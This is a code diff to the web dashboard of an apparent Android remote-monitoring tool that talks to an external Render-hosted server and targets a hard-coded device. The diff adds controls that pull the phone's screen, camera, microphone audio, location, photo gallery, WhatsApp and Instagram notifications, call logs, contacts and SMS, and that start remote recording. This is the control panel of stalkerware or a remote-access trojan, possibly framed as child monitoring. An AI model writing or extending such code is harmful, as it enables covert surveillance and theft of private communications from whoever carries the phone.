@@ -71,12 +71,6 @@
         .control-btn i { font-size: 1.2rem; margin-bottom: 6px; }
         .control-btn span { font-size: 0.6rem; text-align: center; color: #bbb; }
 
-        /* Input Fix for ID */
-        #targetId {
-            background: transparent; border: none; color: white; font-weight: bold; width: 100px;
-            border-bottom: 1px solid #555; text-align: center;
-        }
-
         .fa-whatsapp { color: #25D366; } .fa-instagram { color: #E1306C; } .fa-location-dot { color: #ff4444; }
     </style>
 </head>
@@ -86,7 +80,7 @@
         <div class="header">
             <div>
                 <i class="fa-solid fa-mobile-side"></i>
-                <input type="text" id="targetId" value="M2103K19I">
+                <span class="device-name" id="deviceName">M2103K19I</span>
             </div>
             <div class="status-badge">
                 <span id="statusDot" class="dot"></span>
@@ -117,38 +111,44 @@
         </div>
 
         <div class="controls-grid">
-            <div class="control-btn" onclick="sendCommand('camera')"><i class="fa-solid fa-camera"></i><span>Camera</span></div>
-            <div class="control-btn" onclick="sendCommand('location')"><i class="fa-solid fa-location-dot"></i><span>Location</span></div>
-            <div class="control-btn" onclick="sendCommand('notifications')"><i class="fa-regular fa-message"></i><span>Notify</span></div>
+            <a href="view_screen.html" class="control-btn"><i class="fa-solid fa-mobile-screen"></i><span>Screen</span></a>
+            <a href="view_camera.html" class="control-btn"><i class="fa-solid fa-camera"></i><span>Camera</span></a>
+            <a href="view_audio.html" class="control-btn"><i class="fa-solid fa-microphone"></i><span>Audio</span></a>
+            <a href="view_location.html" class="control-btn"><i class="fa-solid fa-location-dot"></i><span>Location</span></a>
+            <a href="view_gallery.html" class="control-btn"><i class="fa-solid fa-images"></i><span>Gallery</span></a>
+            <a href="view_notifications.html" class="control-btn"><i class="fa-regular fa-message"></i><span>Notify</span></a>
             
             <div class="control-btn" id="soundBtn" onclick="cycleSoundMode()">
                 <i class="fa-solid fa-bell" id="soundIcon"></i><span id="soundText">Sound</span>
             </div>
 
-            <div class="control-btn" onclick="sendCommand('contacts')"><i class="fa-solid fa-address-book"></i><span>Contacts</span></div>
-            <div class="control-btn" onclick="sendCommand('sms')"><i class="fa-solid fa-comments"></i><span>SMS</span></div>
+            <div class="control-btn" onclick="sendCommand('rec_start')"><i class="fa-solid fa-circle-dot"></i><span>Rec</span></div>
+            <a href="view_notifications.html" class="control-btn"><i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span></a>
+            <a href="view_notifications.html" class="control-btn"><i class="fa-brands fa-instagram"></i><span>Instagram</span></a>
+            <a href="view_call_logs.html" class="control-btn"><i class="fa-solid fa-phone"></i><span>Calls</span></a>
             
-            <a href="https://child-v9no.onrender.com/uploads/" target="_blank" class="control-btn">
-                <i class="fa-solid fa-folder-open"></i><span>Files</span>
-            </a>
+            <a href="view_contacts.html" class="control-btn"><i class="fa-solid fa-address-book"></i><span>Contacts</span></a>
             
-            <div class="control-btn" onclick="sendCommand('apps')"><i class="fa-brands fa-google-play"></i><span>Apps</span></div>
+            <a href="view_sms.html" class="control-btn"><i class="fa-solid fa-comments"></i><span>SMS</span></a>
+            <a href="view_apps.html" class="control-btn"><i class="fa-brands fa-google-play"></i><span>Apps</span></a>
         </div>
     </div>
 
     <script>
-        // ⚠️ TUMHARA SERVER URL
-        const BASE_URL = "https://child-v9no.onrender.com/api";
+        // ✅ CORRECT SERVER URL (Local file se connect karne ke liye zaruri hai)
+        const RENDER_URL = "https://child-v9no.onrender.com"; 
+        
+        // ✅ CORRECT DEVICE ID (Jo tumhare logs me dikh raha tha)
+        const DEVICE_ID = "M2103K19I"; 
 
         // --- REAL-TIME DATA FETCHING ---
         function updateDashboard() {
-            // ID Input box se uthayega
-            const deviceId = document.getElementById('targetId').value;
-
-            fetch(`${BASE_URL}/device-status/${deviceId}`)
+            // Child_Phone_01 hata kar DEVICE_ID use kiya
+            fetch(`${RENDER_URL}/api/device-status/${DEVICE_ID}`)
                 .then(res => res.json())
                 .then(data => {
-                    // Update Android Version
+                    // Update Device Name & Version
+                    document.getElementById('deviceName').innerText = data.model || DEVICE_ID;
                     document.getElementById('androidVer').innerText = "V" + (data.version || "--");
                     
                     // Update Connection Status
@@ -159,12 +159,10 @@
                         dot.className = "dot online";
                         statusText.innerText = "Connected";
                         document.getElementById('networkType').innerText = "Online";
-                        statusText.style.color = "#4caf50";
                     } else {
                         dot.className = "dot offline";
                         statusText.innerText = "Disconnected";
                         document.getElementById('networkType').innerText = "Offline";
-                        statusText.style.color = "#ff4444";
                     }
 
                     // Update Battery
@@ -176,7 +174,10 @@
                     // Battery Color change
                     document.getElementById('batteryFill').style.background = battery < 20 ? "#ff4444" : "#4caf50";
                 })
-                .catch(err => console.log("Waiting for server..."));
+                .catch(err => {
+                    console.log("Waiting for server...");
+                    document.getElementById('statusText').innerText = "Connecting...";
+                });
         }
 
         // Poll server every 3 seconds for updates
@@ -193,31 +194,22 @@
             else { icon.className = "fa-solid fa-bell-slash"; text.innerText = "Silent"; sendCommand('silent'); }
         }
 
-        // --- COMMAND SENDING FUNCTION (FIXED) ---
         function sendCommand(action) {
-            const deviceId = document.getElementById('targetId').value;
-            const statusText = document.getElementById('statusText');
-
-            statusText.innerText = "Sending...";
-            
-            fetch(`${BASE_URL}/send-command`, {
+            // URL aur ID sahi kar diya
+            fetch(`${RENDER_URL}/api/send-command`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ device_id: deviceId, command: action })
+                body: JSON.stringify({ device_id: DEVICE_ID, command: action })
             })
             .then(res => res.json())
             .then(data => {
-                if(data.status === 'success'){
-                    alert("✅ Command Sent: " + action); // Simple popup alert
-                    statusText.innerText = "Sent!";
-                } else {
-                    alert("Error: " + data.message);
-                }
+                alert("Command Sent: " + action);
             })
-            .catch(err => {
-                alert("Server Error! Kya Render ki link khuli hai?");
-            });
+            .catch(err => alert("Server Error"));
         }
+        
+        // Start immediately
+        updateDashboard();
     </script>
 </body>
 </html>
